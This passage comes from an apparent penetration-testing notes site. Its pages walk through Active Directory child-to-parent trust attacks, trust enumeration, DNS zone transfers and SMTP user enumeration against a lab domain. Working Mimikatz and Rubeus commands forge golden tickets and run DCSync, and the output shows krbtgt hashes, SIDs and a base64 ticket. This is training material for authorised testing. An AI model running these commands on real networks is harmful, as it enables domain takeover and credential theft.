Opening SVCManager on ACADEMY-EA-DC01.legalcorp.local.....\n[*] Stopping service UVNb.....\n[*] Removing service UVNb.....\n[*] Removing file BnEGssCE.exe.....\n</code></pre> <p>The script lists out the workflow and process in a comment as follows: <pre><code>#   The workflow is as follows:\n#       Input:\n#           1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'\n#              The domain specified MUST be the domain FQDN.\n#           2) Optionally a pathname to save the generated golden ticket (-w switch)\n#           3) Optionally a target-user RID to get credentials (-targetRID switch)\n#              Administrator by default.\n#           4) Optionally a target to PSEXEC with the target-user privileges to (-target-exec switch).\n#              Enterprise Admin by default.\n#\n#       Process:\n#           1) Find out where the child domain controller is located and get its info (via [MS-NRPC])\n#           2) Find out what the forest FQDN is (via [MS-NRPC])\n#           3) Get the forest's Enterprise Admin SID (via [MS-LSAT])\n#           4) Get the child domain's krbtgt credentials (via [MS-DRSR])\n#           5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array\n#              and setting expiration 10 years from now\n#           6) Use the generated ticket to log into the forest and get the target user info (krbtgt/admin by default)\n#           7) If file was specified, save the golden ticket in ccache format\n#           8) If target was specified, a PSEXEC shell is launched\n#\n#       Output:\n#           1) Target user credentials (Forest's krbtgt/admin credentials by default)\n#           2) A golden ticket saved in ccache for future fun and profit\n#           3) PSExec Shell with the target-user privileges (Enterprise Admin privileges by default) at target-exec\n#              parameter.\n</code></pre></p> <p>Though tools such as <code>raiseChild.py</code> can be handy and save us time, it is essential to understand the process and be able to perform the more manual version by gathering all of the required data points.</p>","title":"Attacking Domain Trusts - Child -> Parent - from Linux"},{"location":"active_directory/why_so_trusting/atk_dom_trust_child_parent_trust_from_win/","text":"ExtraSids Attack - Mimikatz <p>This attack allows for the compromise of a parent domain once the child domain has been compromised. To perform this attack after compromising a child domain, we need the following:</p> <ul> <li>The KRBTGT hash for the child domain</li> <li>The SID for the child domain</li> <li>The name of a target user in the child domain (does not need to exist!)</li> <li>The FQDN of the child domain.</li> <li>The SID of the Enterprise Admins group of the root domain.</li> <li>With this data collected, the attack can be performed with Mimikatz.</li> </ul> <p>Since we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.</p> <pre><code>PS C:\\xyz&gt;  mimikatz # lsadump::dcsync /user:LOGISTICS\\krbtgt\n[DC] 'LOGISTICS.legalcorp.local' will be the domain\n[DC] 'ACADEMY-EA-DC02.LOGISTICS.legalcorp.local' will be the DC server\n[DC] 'LOGISTICS\\krbtgt' will be the user account\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n\nObject RDN           : krbtgt\n\n** SAM ACCOUNT **\n\nSAM Username         : krbtgt\nAccount Type         : 30000000 ( USER_OBJECT )\nUser Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )\nAccount expiration   :\nPassword last change : 11/1/2021 11:21:33 AM\nObject Security ID   : S-1-5-21-2806153819-209893948-922872689-502\nObject Relative ID   : 502\n\nCredentials:\n  Hash NTLM: 9d765b482771505cbe97411065964d5f\n    ntlm- 0: 9d765b482771505cbe97411065964d5f\n    lm  - 0: 69df324191d4a80f0ed100c10f20561e\n</code></pre> <p>We can use the PowerView <code>Get-DomainSID</code> function to get the SID for the child domain, but this is also visible in the Mimikatz output above.</p> <pre><code>PS C:\\xyz&gt; Get-DomainSID\n\nS-1-5-21-2806153819-209893948-922872689\n</code></pre> <p>Next, we can use <code>Get-DomainGroup</code> from PowerView to obtain the SID for the Enterprise Admins group in the parent domain. We could also do this with the Get-ADGroup cmdlet with a command such as <code>Get-ADGroup -Identity \"Enterprise Admins\" -Server \"legalcorp.local\"</code>.</p> <pre><code>PS C:\\xyz&gt; Get-DomainGroup -Domain legalcorp.local -Identity \"Enterprise Admins\" | select distinguishedname,objectsid\n\ndistinguishedname                                       objectsid                                    \n-----------------                                       ---------                                    \nCN=Enterprise Admins,CN=Users,DC=LEGALCORP,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519\n</code></pre> <p>At this point, we have gathered the following data points:</p> <ul> <li>The KRBTGT hash for the child domain: <code>9d765b482771505cbe97411065964d5f</code> </li> <li>The SID for the child domain: <code>S-1-5-21-2806153819-209893948-922872689</code> </li> <li>The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: <code>hacker</code> </li> <li>The FQDN of the child domain: <code>LOGISTICS.legalcorp.local</code> </li> <li>The SID of the Enterprise Admins group of the root domain: <code>S-1-5-21-3842939050-3880317879-2865463114-519</code> </li> </ul> <p>Before the attack, we can confirm no access to the file system of the DC in the parent domain.</p> <pre><code>PS C:\\xyz&gt; ls \\\\academy-ea-dc01.legalcorp.local\\c$\n\nls : Access is denied\nAt line:1 char:1\n+ ls \\\\academy-ea-dc01.legalcorp.local\\c$\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : PermissionDenied: (\\\\academy-ea-dc01.legalcorp.local\\c$:String) [Get-ChildItem], UnauthorizedAccessException\n    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand\n</code></pre> <p>Using Mimikatz and the data listed above, we can create a Golden Ticket to access all resources within the parent domain.</p> <pre><code>PS C:\\xyz&gt; mimikatz.exe\n\nmimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.legalcorp.local /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt\nUser      : hacker\nDomain    : LOGISTICS.legalcorp.local (LOGISTICS)\nSID       : S-1-5-21-2806153819-209893948-922872689\nUser Id   : 500\nGroups Id : *513 512 520 518 519\nExtra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;\nServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt\nLifetime  : 3/28/2022 7:59:50 PM ; 3/25/2032 7:59:50 PM ; 3/25/2032 7:59:50 PM\n-&gt; Ticket : ** Pass The Ticket **\n\n * PAC generated\n * PAC signed\n * EncTicketPart generated\n * EncTicketPart encrypted\n * KrbCred generated\n\nGolden ticket for 'hacker @ LOGISTICS.legalcorp.local' successfully submitted for current session\n</code></pre> <p>We can confirm that the Kerberos ticket for the non-existent hacker user is residing in memory.</p> <pre><code>PS C:\\xyz&gt; klist\n\nCurrent LogonId is 0:0xf6462\n\nCached Tickets: (1)\n\n#0&gt;     Client: hacker @ LOGISTICS.legalcorp.local\n        Server: krbtgt/LOGISTICS.legalcorp.local @ LOGISTICS.legalcorp.local\n        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)\n        Ticket Flags 0x40e00000 -&gt; forwardable renewable initial pre_authent\n        Start Time: 3/28/2022 19:59:50 (local)\n        End Time:   3/25/2032 19:59:50 (local)\n        Renew Time: 3/25/2032 19:59:50 (local)\n        Session Key Type: RSADSI RC4-HMAC(NT)\n        Cache Flags: 0x1 -&gt; PRIMARY\n        Kdc Called:\n</code></pre> <p>From here, it is possible to access any resources within the parent domain, and we could compromise the parent domain in several ways.</p> <pre><code>PS C:\\xyz&gt; ls \\\\academy-ea-dc01.legalcorp.local\\c$\n Volume in drive \\\\academy-ea-dc01.legalcorp.local\\c$ has no label.\n Volume Serial Number is B8B3-0D72\n\n Directory of \\\\academy-ea-dc01.legalcorp.local\\c$\n\n09/15/2018  12:19 AM    &lt;DIR&gt;          PerfLogs\n10/06/2021  01:50 PM    &lt;DIR&gt;          Program Files\n09/15/2018  02:06 AM    &lt;DIR&gt;          Program Files (x86)\n11/19/2021  12:17 PM    &lt;DIR&gt;          Shares\n10/06/2021  10:31 AM    &lt;DIR&gt;          Users\n03/21/2022  12:18 PM    &lt;DIR&gt;          Windows\n               0 File(s)              0 bytes\n               6 Dir(s)  18,080,178,176 bytes free\n</code></pre>  ExtraSids Attack - Rubeus <p>We can also perform this attack using Rubeus. Confirm that we cannot access the parent domain Domain Controller's file system. <pre><code>PS C:\\xyz&gt; ls \\\\academy-ea-dc01.legalcorp.local\\c$\n\nls : Access is denied\nAt line:1 char:1\n+ ls \\\\academy-ea-dc01.legalcorp.local\\c$\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : PermissionDenied: (\\\\academy-ea-dc01.legalcorp.local\\c$:String) [Get-ChildItem], UnauthorizedAcces \n   sException\n    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand\n\n&lt;SNIP&gt; \n</code></pre></p> <p>The <code>/rc4</code> flag is the NT hash for the KRBTGT account. The <code>/sids</code> flag will tell Rubeus to create our Golden Ticket giving us the same rights as members of the Enterprise Admins group in the parent domain.</p> <pre><code>PS C:\\xyz&gt;  .\\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.legalcorp.local /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt\n\n   ______        _                      \n  (_____ \\      | |                     \n   _____) )_   _| |__  _____ _   _  ___ \n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.0.2 \n\n[*] Action: Build TGT\n\n[*] Building PAC\n\n[*] Domain         : LOGISTICS.legalcorp.local (LOGISTICS)\n[*] SID            : S-1-5-21-2806153819-209893948-922872689\n[*] UserId         : 500\n[*] Groups         : 520,512,513,519,518\n[*] ExtraSIDs      : S-1-5-21-3842939050-3880317879-2865463114-519\n[*] ServiceKey     : 9D765B482771505CBE97411065964D5F\n[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5\n[*] KDCKey         : 9D765B482771505CBE97411065964D5F\n[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5\n[*] Service        : krbtgt\n[*] Target         : LOGISTICS.legalcorp.local\n\n[*] Generating EncTicketPart\n[*] Signing PAC\n[*] Encrypting EncTicketPart\n[*] Generating Ticket\n[*] Generated KERB-CRED\n[*] Forged a TGT for 'hacker@LOGISTICS.legalcorp.local'\n\n[*] AuthTime       : 3/29/2022 10:06:41 AM\n[*] StartTime      : 3/29/2022 10:06:41 AM\n[*] EndTime        : 3/29/2022 8:06:41 PM\n[*] RenewTill      : 4/5/2022 10:06:41 AM\n\n[*] base64(ticket.kirbi):\n      doIF0zCCBc+gAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoR8bHUxPR0lTVElDUy5JTkxBTkVG\n      UkVJR0hULkxPQ0FMojIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5M\n      T0NBTKOCBDIwggQuoAMCARehAwIBA6KCBCAEggQc0u5onpWKAP0Hw0KJuEOAFp8OgfBXlkwH3sXu5BhH\n      T3zO/Ykw2Hkq2wsoODrBj0VfvxDNNpvysToaQdjHIqIqVQ9kXfNHM7bsQezS7L1KSx++2iX94uRrwa/S\n      VfgHhAuxKPlIi2phwjkxYETluKl26AUo2+WwxDXmXwGJ6LLWN1W4YGScgXAX+Kgs9xrAqJMabsAQqDfy\n      k7+0EH9SbmdQYqvAPrBqYEnt0mIPM9cakei5ZS1qfUDWjUN4mxsqINm7qNQcZHWN8kFSfAbqyD/OZIMc\n      g78hZ8IYL+Y4LPEpiQzM8JsXqUdQtiJXM3Eig6RulSxCo9rc5YUWTaHx/i3PfWqP+dNREtldE2sgIUQm\n      9f3cO1aOCt517Mmo7lICBFXUTQJvfGFtYdc01fWLoN45AtdpJro81GwihIFMcp/vmPBlqQGxAtRKzgzY\n      acuk8YYogiP6815+x4vSZEL2JOJyLXSW0OPhguYSqAIEQshOkBm2p2jahQWYvCPPDd/EFM7S3NdMnJOz\n      X3P7ObzVTAPQ/o9lSaXlopQH6L46z6PTcC/4GwaRbqVnm1RU0O3VpVr5bgaR+Nas5VYGBYIHOw3Qx5YT\n      3dtLvCxNa3cEgllr9N0BjCl1iQGWyFo72JYI9JLV0VAjnyRxFqHztiSctDExnwqWiyDaGET31PRdEz+H\n      WlAi4Y56GaDPrSZFS1RHofKqehMQD6gNrIxWPHdS9aiMAnhQth8GKbLqimcVrCUG+eghE+CN999gHNMG\n      Be1Vnz8Oc3DIM9FNLFVZiqJrAvsq2paakZnjf5HXOZ6EdqWkwiWpbGXv4qyuZ8jnUyHxavOOPDAHdVeo\n      /RIfLx12GlLzN5y7132Rj4iZlkVgAyB6+PIpjuDLDSq6UJnHRkYlJ/3l5j0KxgjdZbwoFbC7p76IPC3B\n      aY97mXatvMfrrc/Aw5JaIFSaOYQ8M/frCG738e90IK/2eTFZD9/kKXDgmwMowBEmT3IWj9lgOixNcNV/\n      OPbuqR9QiT4psvzLGmd0jxu4JSm8Usw5iBiIuW/pwcHKFgL1hCBEtUkaWH24fuJuAIdei0r9DolImqC3\n      sERVQ5VSc7u4oaAIyv7Acq+UrPMwnrkDrB6C7WBXiuoBAzPQULPTWih6LyAwenrpd0sOEOiPvh8NlvIH\n      eOhKwWOY6GVpVWEShRLDl9/XLxdnRfnNZgn2SvHOAJfYbRgRHMWAfzA+2+xps6WS/NNf1vZtUV/KRLlW\n      sL5v91jmzGiZQcENkLeozZ7kIsY/zadFqVnrnQqsd97qcLYktZ4yOYpxH43JYS2e+cXZ+NXLKxex37HQ\n      F5aNP7EITdjQds0lbyb9K/iUY27iyw7dRVLz3y5Dic4S4+cvJBSz6Y1zJHpLkDfYVQbBUCfUps8ImJij\n      Hf+jggEhMIIBHaADAgEAooIBFASCARB9ggEMMIIBCKCCAQQwggEAMIH9oBswGaADAgEXoRIEEBrCyB2T\n      JTKolmppTTXOXQShHxsdTE9HSVNUSUNTLklOTEFORUZSRUlHSFQuTE9DQUyiEzARoAMCAQGhCjAIGwZo\n      YWNrZXKjBwMFAEDgAACkERgPMjAyMjAzMjkxNzA2NDFapREYDzIwMjIwMzI5MTcwNjQxWqYRGA8yMDIy\n      MDMzMDAzMDY0MVqnERgPMjAyMjA0MDUxNzA2NDFaqB8bHUxPR0lTVElDUy5JTkxBTkVGUkVJR0hULkxP\n      Q0FMqTIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5MT0NBTA==\n\n[+] Ticket successfully imported!\n</code></pre> <p>We can check that the ticket is in memory using the <code>klist</code> command.</p> <pre><code>PS C:\\xyz&gt; klist\n\nCurrent LogonId is 0:0xf6495\n\nCached Tickets: (1)\n\n#0&gt; Client: hacker @ LOGISTICS.legalcorp.local\n    Server: krbtgt/LOGISTICS.legalcorp.local @ LOGISTICS.legalcorp.local\n    KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)\n    Ticket Flags 0x40e00000 -&gt; forwardable renewable initial pre_authent \n    Start Time: 3/29/2022 10:06:41 (local)\n    End Time:   3/29/2022 20:06:41 (local)\n    Renew Time: 4/5/2022 10:06:41 (local)\n    Session Key Type: RSADSI RC4-HMAC(NT)\n    Cache Flags: 0x1 -&gt; PRIMARY \n    Kdc Called: \n</code></pre> <p>Finally, we can test this access by performing a DCSync attack against the parent domain, targeting the <code>lab_adm</code> Domain Admin user.</p> <pre><code>PS C:\\Tools\\mimikatz\\x64&gt; .\\mimikatz.exe\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       &gt; https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz # lsadump::dcsync /user:LEGALCORP\\lab_adm\n[DC] 'legalcorp.local' will be the domain\n[DC] 'ACADEMY-EA-DC01.legalcorp.local' will be the DC server\n[DC] 'LEGALCORP\\lab_adm' will be the user account\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n\nObject RDN           : lab_adm\n\n** SAM ACCOUNT **\n\nSAM Username         : lab_adm\nAccount Type         : 30000000 ( USER_OBJECT )\nUser Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )\nAccount expiration   :\nPassword last change : 2/27/2022 10:53:21 PM\nObject Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001\nObject Relative ID   : 1001\n\nCredentials:\n  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6\n    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6\n    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6\n    lm  - 0: 6053227db44e996fe16b107d9d1e95a0\n</code></pre>","title":"Attacking Domain Trusts - Child -> Parent - from Windows"},{"location":"active_directory/why_so_trusting/domain_trusts_primer/","text":"Enumerating Trust Relationships <p>We can use the Get-ADTrust cmdlet to enumerate domain trust relationships. This is especially helpful if we are limited to just using built-in tools.</p> <pre><code>PS C:\\xyz&gt; Import-Module activedirectory\nPS C:\\xyz&gt; Get-ADTrust -Filter *\n\nDirection               : BiDirectional\nDisallowTransivity      : False\nDistinguishedName       : CN=LOGISTICS.legalcorp.local,CN=System,DC=LEGALCORP,DC=LOCAL\nForestTransitive        : False\nIntraForest             : True\nIsTreeParent            : False\nIsTreeRoot              : False\nName                    : LOGISTICS.legalcorp.local\nObjectClass             : trustedDomain\nObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec\nSelectiveAuthentication : False\nSIDFilteringForestAware : False\nSIDFilteringQuarantined : False\nSource                  : DC=LEGALCORP,DC=LOCAL\nTarget                  : LOGISTICS.legalcorp.local\nTGTDelegation           : False\nTrustAttributes         : 32\nTrustedPolicy           :\nTrustingPolicy          :\nTrustType               : Uplevel\nUplevelOnly             : False\nUsesAESKeys             : False\nUsesRC4Encryption       : False\n\nDirection               : BiDirectional\nDisallowTransivity      : False\nDistinguishedName       : CN=LEGALLOGISTICS.LOCAL,CN=System,DC=LEGALCORP,DC=LOCAL\nForestTransitive        : True\nIntraForest             : False\nIsTreeParent            : False\nIsTreeRoot              : False\nName                    : LEGALLOGISTICS.LOCAL\nObjectClass             : trustedDomain\nObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca\nSelectiveAuthentication : False\nSIDFilteringForestAware : False\nSIDFilteringQuarantined : False\nSource                  : DC=LEGALCORP,DC=LOCAL\nTarget                  : LEGALLOGISTICS.LOCAL\nTGTDelegation           : False\nTrustAttributes         : 8\nTrustedPolicy           :\nTrustingPolicy          :\nTrustType               : Uplevel\nUplevelOnly             : False\nUsesAESKeys             : False\nUsesRC4Encryption       : False\n</code></pre> <p>The above output shows that our current domain <code>legalcorp.local</code> has two domain trusts. The first is with <code>LOGISTICS.legalcorp.local</code>, and the <code>IntraForest</code> property shows that this is a child domain, and we are currently positioned in the root domain of the forest. The second trust is with the domain <code>LEGALLOGISTICS.LOCAL,</code> and the <code>ForestTransitive</code> property is set to <code>True</code>, which means that this is a forest trust or external trust. We can see that both trusts are set up to be bidirectional, meaning that users can authenticate back and forth across both trusts. If we cannot authenticate across a trust, we cannot perform any enumeration or attacks across the trust.</p> <p>After importing PowerView, we can use the Get-DomainTrust function to enumerate what trusts exist, if any.</p> <pre><code>PS C:\\xyz&gt; Get-DomainTrust \n\nSourceName      : legalcorp.local\nTargetName      : LOGISTICS.legalcorp.local\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : WITHIN_FOREST\nTrustDirection  : Bidirectional\nWhenCreated     : 11/1/2021 6:20:22 PM\nWhenChanged     : 2/26/2022 11:55:55 PM\n\nSourceName      : legalcorp.local\nTargetName      : LEGALLOGISTICS.LOCAL\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : FOREST_TRANSITIVE\nTrustDirection  : Bidirectional\nWhenCreated     : 11/1/2021 8:07:09 PM\nWhenChanged     : 2/27/2022 12:02:39 AM\n</code></pre> <p>PowerView can be used to perform a domain trust mapping and provide information such as the type of trust (parent/child, external, forest) and the direction of the trust (one-way or bidirectional). This information is beneficial once a foothold is obtained, and we plan to compromise the environment further.</p> <pre><code>PS C:\\xyz&gt; Get-DomainTrustMapping\n\nSourceName      : legalcorp.local\nTargetName      : LOGISTICS.legalcorp.local\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : WITHIN_FOREST\nTrustDirection  : Bidirectional\nWhenCreated     : 11/1/2021 6:20:22 PM\nWhenChanged     : 2/26/2022 11:55:55 PM\n\nSourceName      : legalcorp.local\nTargetName      : LEGALLOGISTICS.LOCAL\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : FOREST_TRANSITIVE\nTrustDirection  : Bidirectional\nWhenCreated     : 11/1/2021 8:07:09 PM\nWhenChanged     : 2/27/2022 12:02:39 AM\n\nSourceName      : LEGALLOGISTICS.LOCAL\nTargetName      : legalcorp.local\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : FOREST_TRANSITIVE\nTrustDirection  : Bidirectional\nWhenCreated     : 11/1/2021 8:07:08 PM\nWhenChanged     : 2/27/2022 12:02:41 AM\n\nSourceName      : LOGISTICS.legalcorp.local\nTargetName      : legalcorp.local\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : WITHIN_FOREST\nTrustDirection  : Bidirectional\nWhenCreated     : 11/1/2021 6:20:22 PM\nWhenChanged     : 2/26/2022 11:55:55 PM\n</code></pre> <p>From here, we could begin performing enumeration across the trusts. For example, we could look at all users in the child domain:</p> <pre><code>PS C:\\xyz&gt; Get-DomainUser -Domain LOGISTICS.legalcorp.local | select SamAccountName\n\nsamaccountname\n--------------\nuser_adm\nAdministrator\nGuest\nlab_adm\nkrbtgt\n</code></pre> <p>We can also use BloodHound to visualize these trust relationships by using the <code>Map Domain Trusts</code> pre-built query.</p>","title":"Domain Trusts Primer"},{"location":"attacking_common_services/attacking_dns/","text":"DNS Zone Transfer <p>A DNS zone is a portion of the DNS namespace that a specific organization or administrator manages. Since DNS comprises multiple DNS zones, DNS servers utilize DNS zone transfers to copy a portion of their database to another DNS server. Unless a DNS server is configured correctly (limiting which IPs can perform a DNS zone transfer), anyone can ask a DNS server for a copy of its zone information since DNS zone transfers do not require any authentication.</p> <p>An attacker could leverage this DNS zone transfer vulnerability to learn more about the target organization's DNS namespace, increasing the attack surface.</p> <pre><code>secops@kali[/kali]# dig AXFR @ns1.LEGALCORP.xyz LEGALCORP.xyz\n\n; &lt;&lt;&gt;&gt; DiG 9.11.5-P1-1-Debian &lt;&lt;&gt;&gt; axfr legalcorp.local @10.129.110.213\n;; global options: +cmd\nlegalcorp.local.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800\nlegalcorp.local.         604800  IN      AAAA    ::1\nlegalcorp.local.         604800  IN      NS      localhost.\nlegalcorp.local.         604800  IN      A       10.129.110.22\nadmin.legalcorp.local.   604800  IN      A       10.129.110.21\nhr.legalcorp.local.      604800  IN      A       10.129.110.25\nsupport.legalcorp.local. 604800  IN      A       10.129.110.28\nlegalcorp.local.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800\n;; Query time: 28 msec\n;; SERVER: 10.129.110.213#53(10.129.110.213)\n;; WHEN: Mon Oct 11 17:20:13 EDT 2020\n;; XFR size: 8 records (messages 1, bytes 289)\n</code></pre> <p>Tools like Fierce can also be used to enumerate all DNS servers of the root domain and scan for a DNS zone transfer:</p> <pre><code>secops@kali[/kali]# fierce --domain zonetransfer.me\n\nNS: nsztm2.digi.ninja. nsztm1.digi.ninja.\nSOA: nsztm1.digi.ninja. (81.4.108.41)\nZone: success\n{&lt;DNS name @&gt;: '@ 7200 IN SOA nsztm1.digi.ninja. robin.digi.ninja. 2019100801 '\n               '172800 900 1209600 3600\\n'\n               '@ 300 IN HINFO \"Casio fx-700G\" \"Windows XP\"\\n'\n               '@ 301 IN TXT '\n               '\"google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA\"\\n'\n               '@ 7200 IN MX 0 ASPMX.L.GOOGLE.COM.\\n'\n               '@ 7200 IN MX 10 ALT1.ASPMX.L.GOOGLE.COM.\\n'\n               '@ 7200 IN MX 10 ALT2.ASPMX.L.GOOGLE.COM.\\n'\n               '@ 7200 IN MX 20 ASPMX2.GOOGLEMAIL.COM.\\n'\n               '@ 7200 IN MX 20 ASPMX3.GOOGLEMAIL.COM.\\n'\n               '@ 7200 IN MX 20 ASPMX4.GOOGLEMAIL.COM.\\n'\n               '@ 7200 IN MX 20 ASPMX5.GOOGLEMAIL.COM.\\n'\n               '@ 7200 IN A 5.196.105.14\\n'\n               '@ 7200 IN NS nsztm1.digi.ninja.\\n'\n               '@ 7200 IN NS nsztm2.digi.ninja.',\n &lt;DNS name _acme-challenge&gt;: '_acme-challenge 301 IN TXT '\n                             '\"6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI\"',\n &lt;DNS name _sip._tcp&gt;: '_sip._tcp 14000 IN SRV 0 0 5060 www',\n &lt;DNS name 14.105.196.5.IN-ADDR.ARPA&gt;: '14.105.196.5.IN-ADDR.ARPA 7200 IN PTR '\n                                       'www',\n &lt;DNS name asfdbauthdns&gt;: 'asfdbauthdns 7900 IN AFSDB 1 asfdbbox',\n &lt;DNS name asfdbbox&gt;: 'asfdbbox 7200 IN A 127.0.0.1',\n &lt;DNS name asfdbvolume&gt;: 'asfdbvolume 7800 IN AFSDB 1 asfdbbox',\n &lt;DNS name canberra-office&gt;: 'canberra-office 7200 IN A 202.14.81.230',\n &lt;DNS name cmdexec&gt;: 'cmdexec 300 IN TXT \"; ls\"',\n &lt;DNS name contact&gt;: 'contact 2592000 IN TXT \"Remember to call or email Pippa '\n                     'on +44 123 4567890 or pippa@zonetransfer.me when making '\n                     'DNS changes\"',\n &lt;DNS name dc-office&gt;: 'dc-office 7200 IN A 143.228.181.132',\n &lt;DNS name deadbeef&gt;: 'deadbeef 7201 IN AAAA dead:beaf::',\n &lt;DNS name dr&gt;: 'dr 300 IN LOC 53 20 56.558 N 1 38 33.526 W 0.00m',\n &lt;DNS name DZC&gt;: 'DZC 7200 IN TXT \"AbCdEfG\"',\n &lt;DNS name email&gt;: 'email 2222 IN NAPTR 1 1 \"P\" \"E2U+email\" \"\" '\n                   'email.zonetransfer.me\\n'\n                   'email 7200 IN A 74.125.206.26',\n &lt;DNS name Hello&gt;: 'Hello 7200 IN TXT \"Hi to Josh and all his class\"',\n &lt;DNS name home&gt;: 'home 7200 IN A 127.0.0.1',\n &lt;DNS name Info&gt;: 'Info 7200 IN TXT \"ZoneTransfer.me service provided by Robin '\n                  'Wood - robin@digi.ninja. See '\n                  'http://digi.ninja/projects/zonetransferme.php for more '\n                  'information.\"',\n &lt;DNS name internal&gt;: 'internal 300 IN NS intns1\\ninternal 300 IN NS intns2',\n &lt;DNS name intns1&gt;: 'intns1 300 IN A 81.4.108.41',\n &lt;DNS name intns2&gt;: 'intns2 300 IN A 167.88.42.94',\n &lt;DNS name office&gt;: 'office 7200 IN A 4.23.39.254',\n &lt;DNS name ipv6actnow.org&gt;: 'ipv6actnow.org 7200 IN AAAA '\n                            '2001:67c:2e8:11::c100:1332',\n...SNIP...\n</code></pre>","title":"DNS"},{"location":"attacking_common_services/attacking_email_services/","text":"Enumeration <p>Query information about the MX records</p> <p>Host - MX Records <pre><code>secops@kali[/kali]$ host -t MX secops.cc\n\nsecops.cc mail is handled by 1 aspmx.l.google.com.\n</code></pre></p> <pre><code>secops@kali[/kali]$ host -t MX microsoft.com\n\nmicrosoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.\n</code></pre> <p>DIG - MX Records <pre><code>secops@kali[/kali]$ dig mx plaintext.do | grep \"MX\" | grep -v \";\"\n\nplaintext.do.           7076    IN      MX      50 mx3.zoho.com.\nplaintext.do.           7076    IN      MX      10 mx.zoho.com.\nplaintext.do.           7076    IN      MX      20 mx2.zoho.com.\n</code></pre></p> <pre><code>secops@kali[/kali]$ dig mx LEGALCORP.com | grep \"MX\" | grep -v \";\"\n\nLEGALCORP.com.      300     IN      MX      10 mail1.LEGALCORP.com.\n</code></pre> <p>DIG - A Record for MX <pre><code>secops@kali[/kali]$ host -t A mail1.LEGALCORP.xyz.\n\nmail1.LEGALCORP.xyz has address 10.129.14.128\n</code></pre></p>  Misconfigurations <p><code>VRFY</code> this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.</p> <pre><code>secops@kali[/kali]$ telnet 10.10.110.20 25\n\nTrying 10.10.110.20...\nConnected to 10.10.110.20.\nEscape character is '^]'.\n220 parrot ESMTP Postfix (Debian/GNU)\n\n\nVRFY root\n\n252 2.0.0 root\n\n\nVRFY www-data\n\n252 2.0.0 www-data\n\n\nVRFY new-user\n\n550 5.1.1 &lt;new-user&gt;: Recipient address rejected: User unknown in local recipient table\n</code></pre> <p><code>EXPN</code> is similar to <code>VRFY</code>, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the <code>VRFY</code> command since sites often have an alias such as \"all.\"</p> <pre><code>secops@kali[/kali]$ telnet 10.10.110.20 25\n\nTrying 10.10.110.20...\nConnected to 10.10.110.20.\nEscape character is '^]'.\n220 parrot ESMTP Postfix (Debian/GNU)\n\n\nEXPN john\n\n250 2.1.0 john@LEGALCORP.xyz\n\n\nEXPN support-team\n\n250 2.0.0 carol@LEGALCORP.xyz\n250 